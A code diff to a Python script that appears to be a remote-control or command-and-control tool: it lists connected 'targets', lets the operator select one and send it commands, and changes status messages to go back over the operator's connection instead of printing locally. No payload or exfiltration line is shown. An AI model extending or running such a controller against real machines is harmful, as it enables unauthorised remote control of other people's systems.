@@ -19,14 +19,14 @@ def send_data_target(ser):
             if cmd == 'list' or cmd == 'ls':
                 list_connections(ser)
             elif 'select' in cmd:
-                conn = get_target(cmd)
+                conn = get_target(cmd,ser)
                 if conn is not None:
                     send_target_commands(conn,ser)
             elif 'exit' == cmd:
                 quit()
 
             else:
-                print("Command not recognized")
+                sudo_user.sender(ser,"Command not recognized")
 
 
     # Display all current active connections with client
@@ -43,13 +43,15 @@ def send_data_target(ser):
                 del normal_clients.all_address[i]
                 continue
 
-            results = [all_address[i][0],all_address[i][1]]
-            sudo_user.sender(ser, results)
+            
+            results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
+        print(results)
+        sudo_user.sender(ser, results)
         
 
 
     # Selecting the target
-    def get_target(cmd):
+    def get_target(cmd,ser):
         try:
             target = cmd.replace('select ', '')  # target = id
             target = int(target)
@@ -60,7 +62,7 @@ def send_data_target(ser):
             # 192.168.0.4> dir
 
         except:
-            print("Selection not valid")
+            sudo_user.sender(ser,"Selection not valid")
             return None
 
 
